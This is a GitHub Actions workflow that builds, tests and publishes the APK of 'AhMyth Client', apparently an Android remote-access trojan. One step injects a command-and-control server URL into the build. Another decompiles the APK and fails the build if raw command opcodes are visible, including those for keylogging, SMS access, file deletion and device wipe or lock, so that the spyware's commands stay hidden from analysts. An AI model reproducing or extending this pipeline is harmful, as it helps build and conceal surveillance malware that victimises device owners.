# AhMyth Client — CI/CD Pipeline
# ================================
# Builds the Android APK, runs unit tests, checks lint, and uploads
# the debug APK as a downloadable artifact on every push and PR.
#
# Required secrets (set in GitHub repo Settings → Secrets and variables):
#   None required for debug builds.
#
# To customize the SOCKET_URL for CI builds, add a secret named
# CI_SOCKET_URL and the workflow will use it. Otherwise it uses
# the URL hardcoded in app/build.gradle.

name: Build & Test

on:
  push:
    branches:
      - main
      - modernization-and-persistence
      - 'feat/**'
      - 'fix/**'
      - 'docs/**'
  pull_request:
    branches:
      - main
      - modernization-and-persistence
  workflow_dispatch:    # Allow manual trigger from GitHub UI

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

env:
  COMPILE_SDK: 34
  BUILD_TOOLS: 34.0.0
  JAVA_VERSION: 17
  # Debug keystore credentials (standard Android debug keystore defaults)
  DEBUG_KEYSTORE_PASS: android
  DEBUG_KEY_ALIAS: androiddebugkey
  DEBUG_KEY_PASS: android

jobs:
  # ──────────────────────────────────────────────
  # JOB: Validate — checks formatting and lint
  # ──────────────────────────────────────────────
  validate:
    name: Lint & Validate
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK ${{ env.JAVA_VERSION }}
        uses: actions/setup-java@v4
        with:
          java-version: ${{ env.JAVA_VERSION }}
          distribution: 'temurin'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: ${{ env.COMPILE_SDK }}
          build-tools-version: ${{ env.BUILD_TOOLS }}

      - name: Create Android debug keystore (if missing)
        run: |
          KEYSTORE_DIR="$HOME/.android"
          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
          mkdir -p "$KEYSTORE_DIR"
          if [ ! -f "$KEYSTORE_FILE" ]; then
            echo "Creating debug keystore at $KEYSTORE_FILE..."
            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
              -keypass "${{ env.DEBUG_KEY_PASS }}" \
              -keyalg RSA -keysize 2048 -validity 10000 \
              -dname "CN=Android Debug,O=Android,C=US" \
              -noprompt
            echo "✅ Debug keystore created"
          else
            echo "✅ Debug keystore already exists"
          fi

      - name: Verify NDK and CMake
        run: |
          echo "::group::CMake version"
          cmake --version || echo "⚠️ cmake not found — will be downloaded by Gradle"
          echo "::endgroup::"
          echo "::group::NDK locations"
          ls -la "$ANDROID_HOME/ndk/" 2>/dev/null || echo "No NDK installed yet — Gradle will download NDK from sdkmanager"
          echo "::endgroup::"

      - name: Cache Gradle dependencies
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
            !~/.gradle/caches/build-cache-*
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      - name: Make Gradlew executable
        run: chmod +x gradlew

      - name: Run Android Lint
        run: ./gradlew lintDebug --no-daemon --stacktrace

      - name: Upload lint results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: lint-report
          path: app/build/reports/lint-results-*.html
          retention-days: 7
          if-no-files-found: warn

  # ──────────────────────────────────────────────
  # JOB: Test — runs unit tests
  # ──────────────────────────────────────────────
  test:
    name: Unit Tests
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK ${{ env.JAVA_VERSION }}
        uses: actions/setup-java@v4
        with:
          java-version: ${{ env.JAVA_VERSION }}
          distribution: 'temurin'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: ${{ env.COMPILE_SDK }}
          build-tools-version: ${{ env.BUILD_TOOLS }}

      - name: Create Android debug keystore (if missing)
        run: |
          KEYSTORE_DIR="$HOME/.android"
          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
          mkdir -p "$KEYSTORE_DIR"
          if [ ! -f "$KEYSTORE_FILE" ]; then
            echo "Creating debug keystore at $KEYSTORE_FILE..."
            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
              -keypass "${{ env.DEBUG_KEY_PASS }}" \
              -keyalg RSA -keysize 2048 -validity 10000 \
              -dname "CN=Android Debug,O=Android,C=US" \
              -noprompt
            echo "✅ Debug keystore created"
          else
            echo "✅ Debug keystore already exists"
          fi

      - name: Cache Gradle dependencies
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
            !~/.gradle/caches/build-cache-*
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      - name: Make Gradlew executable
        run: chmod +x gradlew

      - name: Run unit tests
        run: ./gradlew testDebugUnitTest --no-daemon --stacktrace

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: |
            app/build/reports/tests/
            app/build/test-results/
          retention-days: 14
          if-no-files-found: warn

  # ──────────────────────────────────────────────
  # JOB: Build — compiles and assembles the APK
  # ──────────────────────────────────────────────
  build:
    name: Build APK
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK ${{ env.JAVA_VERSION }}
        uses: actions/setup-java@v4
        with:
          java-version: ${{ env.JAVA_VERSION }}
          distribution: 'temurin'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: ${{ env.COMPILE_SDK }}
          build-tools-version: ${{ env.BUILD_TOOLS }}

      - name: Create Android debug keystore (if missing)
        run: |
          KEYSTORE_DIR="$HOME/.android"
          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
          mkdir -p "$KEYSTORE_DIR"
          if [ ! -f "$KEYSTORE_FILE" ]; then
            echo "Creating debug keystore at $KEYSTORE_FILE..."
            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
              -keypass "${{ env.DEBUG_KEY_PASS }}" \
              -keyalg RSA -keysize 2048 -validity 10000 \
              -dname "CN=Android Debug,O=Android,C=US" \
              -noprompt
            echo "✅ Debug keystore created"
          else
            echo "✅ Debug keystore already exists"
          fi

      - name: Cache Gradle dependencies
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
            !~/.gradle/caches/build-cache-*
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      - name: Cache Gradle build cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches/build-cache-*
          key: ${{ runner.os }}-build-cache-${{ github.sha }}
          restore-keys: |
            ${{ runner.os }}-build-cache-

      - name: Make Gradlew executable
        run: chmod +x gradlew

      # Optionally override SOCKET_URL via repository secret
      # Use job-level env variable to work around secrets not being available in if:
      - name: Configure C2 server URL (if secret set)
        env:
          CI_SOCKET_URL: ${{ secrets.CI_SOCKET_URL }}
        if: ${{ env.CI_SOCKET_URL != '' }}
        run: |
          # Escape the URL for use in sed (handle special chars in URL)
          OLD_URL=$(grep 'SOCKET_URL' app/build.gradle | sed "s/.*\"\\(.*\\)\".*/\\1/")
          NEW_URL="${{ secrets.CI_SOCKET_URL }}"
          echo "Overriding SOCKET_URL: $OLD_URL → $NEW_URL"
          sed -i "s|$OLD_URL|$NEW_URL|g" app/build.gradle

      - name: Verify google-services.json exists
        run: |
          if [ -f app/google-services.json ]; then
            echo "✅ google-services.json found (size: $(wc -c < app/google-services.json) bytes)"
          else
            echo "❌ google-services.json MISSING — Firebase plugin will fail!"
            exit 1
          fi

      - name: Build debug APK
        run: ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Check APK exists
        run: |
          if [ -f app/build/outputs/apk/debug/app-debug.apk ]; then
            echo "APK size: $(du -h app/build/outputs/apk/debug/app-debug.apk | cut -f1)"
          else
            echo "ERROR: APK not found at expected path!"
            exit 1
          fi

      - name: Install jadx and verify no raw C2 opcodes in decompiled APK
        shell: bash
        run: |
          # Install jadx via apt (available on ubuntu-latest runners)
          # If unavailable, we skip the check gracefully — the fallback jar is
          # not used because PATH changes don't persist across shell invocations
          command -v jadx >/dev/null 2>&1 || { sudo apt-get update -qq && sudo apt-get install -y -qq jadx; }

          if ! command -v jadx >/dev/null 2>&1; then
            echo "⚠️  jadx not available, skipping source-leak verification"
            exit 0
          fi

          DECOMP_DIR=/tmp/decompiled-apk
          mkdir -p "$DECOMP_DIR"

          echo "::group::Decompiling APK with jadx..."
          jadx -d "$DECOMP_DIR" -q app/build/outputs/apk/debug/app-debug.apk 2>&1 || \
            echo "(jadx may have warnings — checking output anyway)"
          echo "::endgroup::"

          echo "::group::Verifying no raw C2 opcodes in decompiled sources..."
          if [ -d "$DECOMP_DIR/sources" ]; then
            VIOLATIONS=0

            for opcode in x0000ca x0000sm x0000fm x0000cl x0000cn x0000mc \
                          x0000apps x0000lm x0000runApp x0000openUrl x0000deleteFF \
                          x0000dm x0000lockDevice x0000wipeDevice x0000rebootDevice \
                          x0000sc x0000kl x0000kldata x0000nt; do
              FOUND=$(grep -r "\"$opcode\"" "$DECOMP_DIR/sources" \
                --include="*.java" \
                --exclude="*ObfuscationUtils*" \
                --exclude-dir="android" \
                --exclude-dir="androidx" \
                --exclude-dir="okhttp" \
                --exclude-dir="okio" \
                --exclude-dir="socket" \
                2>/dev/null || true)
              if [ -n "$FOUND" ]; then
                echo "❌ VIOLATION: Raw '$opcode' found in:"
                echo "$FOUND"
                VIOLATIONS=$((VIOLATIONS + 1))
              fi
            done

            echo ""
            if [ "$VIOLATIONS" -eq 0 ]; then
              echo "✅ PASS: No raw C2 opcodes found in decompiled APK"
            else
              echo "❌ FAIL: $VIOLATIONS opcode(s) appear as raw strings in decompiled code"
              exit 1
            fi
          else
            echo "⚠️  jadx output not found, skipping source-leak check"
          fi
          echo "::endgroup::"

      - name: Upload debug APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug-apk
          path: app/build/outputs/apk/debug/app-debug.apk
          retention-days: 30
          if-no-files-found: error

      - name: Upload ProGuard mapping (if generated)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: proguard-mapping
          path: app/build/outputs/mapping/debug/
          retention-days: 14
          if-no-files-found: ignore

  # ──────────────────────────────────────────────
  # JOB: Summary — aggregates results from all jobs
  # ──────────────────────────────────────────────
  summary:
    name: Build Summary
    needs: [validate, test, build]
    runs-on: ubuntu-latest
    if: always()

    steps:
      - name: Check all jobs passed
        run: |
          echo "## ✅ CI Pipeline Results" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          if [ "${{ needs.validate.result }}" = "success" ]; then
            echo "✅ **Lint & Validate** — passed" >> $GITHUB_STEP_SUMMARY
          else
            echo "❌ **Lint & Validate** — ${{ needs.validate.result }}" >> $GITHUB_STEP_SUMMARY
          fi

          if [ "${{ needs.test.result }}" = "success" ]; then
            echo "✅ **Unit Tests** — passed" >> $GITHUB_STEP_SUMMARY
          else
            echo "❌ **Unit Tests** — ${{ needs.test.result }}" >> $GITHUB_STEP_SUMMARY
          fi

          if [ "${{ needs.build.result }}" = "success" ]; then
            echo "✅ **APK Build** — passed (artifact: \`app-debug-apk\`)" >> $GITHUB_STEP_SUMMARY
          else
            echo "❌ **APK Build** — ${{ needs.build.result }}" >> $GITHUB_STEP_SUMMARY
          fi
